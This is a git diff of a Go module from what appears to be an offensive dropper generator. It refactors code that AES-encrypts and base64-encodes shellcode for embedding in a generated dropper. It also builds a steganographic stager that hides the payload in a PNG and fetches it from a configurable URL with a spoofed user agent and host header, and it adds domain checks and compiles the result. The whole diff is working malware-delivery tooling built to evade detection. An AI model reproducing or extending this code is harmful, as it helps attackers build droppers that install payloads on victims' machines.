@@ -1,7 +1,6 @@
 package gengo
 
 import (
-	"fmt"
 	"log"
 	"os"
 	"path/filepath"
@@ -12,7 +11,60 @@ import (
 	"github.com/fatih/color"
 )
 
-func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host, useragent string, sgn bool) {
+func NewShellcode(goDrop *Dropper, input, output, dropname string, sgn bool) (shellcode dropfmt.DropFmt) {
+
+	// if input is CALC, use inbuilt CALC shellcode.
+	if input == "CALC" {
+		shellcode.Buf = CalcCode
+	} else {
+		shellcode = GetShellcode(input)
+	}
+
+	//SGN. Not currently implemented because I honeslty couldn't be bothered.
+	/*if sgn {
+		color.Yellow("Shikata Ga Nai encoding shellcode.")
+		//shellcode.SGN(archInt)
+	}
+	*/
+
+	//Format Shellcode for dropper.
+	_, err := shellcode.AESEncrypt()
+	if err != nil {
+		log.Fatalf("Error Encrypting shellcode:\n%v\n", err)
+	}
+	//Prep shellcode.
+	goDrop.BufStr = `"` + shellcode.ToB64() + `"`
+	goDrop.KeyStr = `"` + shellcode.KeyB64() + `"`
+	if goDrop.Debug {
+
+		writeShellcodeFiles(goDrop.BufStr, goDrop.KeyStr, output, dropname, shellcode.Buf)
+
+	}
+	return shellcode
+}
+
+func NewStager(goDrop *Dropper, shellcode dropfmt.DropFmt, url, img, host, useragent, dropname, output string) {
+	//Add stager code if url is set.
+
+	stagedimage := filepath.Join(output, dropname+"_stager.png")
+	createStagerImg(img, shellcode.ToB64(), stagedimage)
+
+	if useragent == "" {
+		goDrop.Ua = `ua := "` + defaultagent + `"`
+	} else {
+		goDrop.Ua = `ua := "` + useragent + `"`
+	}
+
+	goDrop.HostHdr = `hostname := "` + host + `"`
+	goDrop.Url = `url := "` + url + `"`
+	goDrop.Stager = stegStager
+	goDrop.StagerImport = stagerImport
+	goDrop.StegImport = stegImport
+	goDrop.BufStr = "loadImage()"
+
+}
+
+func NewDropper(goDrop Dropper, dropname, domain, input, output string) {
 	/*
 		Old code to block non-ms dlls from loading into the process, tbh, not super handy and breaks the payloads unfortunately but can uncomment if you want it.
 
@@ -32,81 +84,15 @@ func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host,
 	//Set Debug mode.
 	Debug = goDrop.Debug
 
-	goDrop.LeetImp = " "
-	goDrop.BlockNonMs = " "
+	goDrop.LeetImp = ""
+	goDrop.BlockNonMs = ""
 	goDrop.MemCom = MemCom
 
-	var shellcode dropfmt.DropFmt
 	if Debug {
 		color.Yellow("[gengo] Debug enabled, gengo will save files related to compilation.")
 		if goDrop.Arch {
-			color.Yellow("[gengo]Arch set to x86, please note this is not supported for all droppers.")
+			color.Yellow("[gengo] Arch set to x86, please note this is not supported for all droppers.")
 		}
-	}
-
-	// if input is CALC, use inbuilt CALC shellcode.
-	if input == "CALC" {
-		shellcode.Buf = CalcCode
-	} else {
-		shellcode = GetShellcode(input)
-	}
-	fmt.Println(dropname)
-
-	//SGN. Not currently in use because it is difficult to import and build this library and I couldn't be bothered.
-	if sgn {
-		color.Yellow("Shikata Ga Nai encoding shellcode.")
-		//shellcode.SGN(archInt)
-	}
-
-	//Format Shellcode for dropper.
-	_, err := shellcode.AESEncrypt()
-	if err != nil {
-		log.Fatalf("Error Encrypting shellcode:\n%v\n", err)
-	}
-	//Prep shellcode.
-	goDrop.BufStr = `"` + shellcode.ToB64() + `"`
-	goDrop.KeyStr = `"` + shellcode.KeyB64() + `"`
-	if Debug {
-		//Write shellcode files in case they are needed later.
-		scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
-		scFile, err := os.Create(scFilepath)
-		if err != nil {
-			log.Fatalf("Error creating shellcode file: %v ", err)
-
-		}
-		scFile.WriteString("ShellcodeKey: " + goDrop.KeyStr + "\n")
-		scFile.WriteString("ShellcodeBuf:\n" + goDrop.BufStr)
-		scFile.Close()
-		binFilepath := filepath.Join(output, dropname+"_Clear.bin")
-		fmt.Println(binFilepath)
-		binFile, err := os.Create(binFilepath)
-		if err != nil {
-			log.Fatalf("Error creating shellcode file: %v ", err)
-
-		}
-		binFile.Write(shellcode.Buf)
-		binFile.Close()
-
-	}
-
-	//Add stager code if url is set.
-	if url != "" {
-		stagedimage := filepath.Join(output, dropname+"_stager.png")
-		createStagerImg(img, shellcode.ToB64(), stagedimage)
-
-		if useragent == "" {
-			goDrop.Ua = `ua := "` + defaultagent + `"`
-		} else {
-			goDrop.Ua = `ua := "` + useragent + `"`
-		}
-
-		goDrop.HostHdr = `hostname := "` + host + `"`
-		goDrop.Url = `url := "` + url + `"`
-		goDrop.Stager = stegStager
-		goDrop.StagerImport = stagerImport
-		goDrop.StegImport = stegImport
-		goDrop.BufStr = "loadImage()"
-
 	}
 
 	// Add domain checks.
@@ -119,16 +105,20 @@ func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host,
 		goDrop.Domain = ""
 	}
 
+	outpath, err := filepath.Abs(output)
+	if err != nil {
+		log.Fatalf("Error getting absolute path for output: %v", err)
+	}
 	//write our dropper template.
 	dropfilename := dropname + ".go"
-	dropFilepath := filepath.Join(output, dropfilename)
+	dropFilepath := filepath.Join(outpath, dropfilename)
 	dropperFile, err := os.Create(dropFilepath)
 	if err != nil {
 		log.Fatalf("Error creating dropper file: %v ", err)
 	}
 
 	//Write the final template
-	err = goDrop.writeFinalTemplate(dropperFile)
+	err = goDrop.writeFinalGoTemplate(dropperFile)
 	if err != nil {
 		log.Fatalf("Error writing dropper source:\n%v\n", err)
 	}
@@ -136,7 +126,7 @@ func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host,
 	color.Green("Dropper src written to: %s\n", dropFilepath)
 
 	//generate the build files and
-	err = buildInstruct(output, dropfilename, goDrop.Shared, goDrop.Arch)
+	err = buildInstruct(outpath, dropfilename, goDrop.Shared, goDrop.Arch)
 	if err != nil {
 		log.Fatal(err)
 
@@ -145,9 +135,8 @@ func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host,
 	wd, _ := os.Getwd()
 
 	//compile the dropper with the regular go compiler.
-	if Leet {
-		buildFileGo(output, dropfilename, goDrop.Shared, goDrop.Arch)
-	}
+
+	buildFileGo(outpath, dropfilename, goDrop.Shared, goDrop.Arch)
 
 	if !Debug {
 
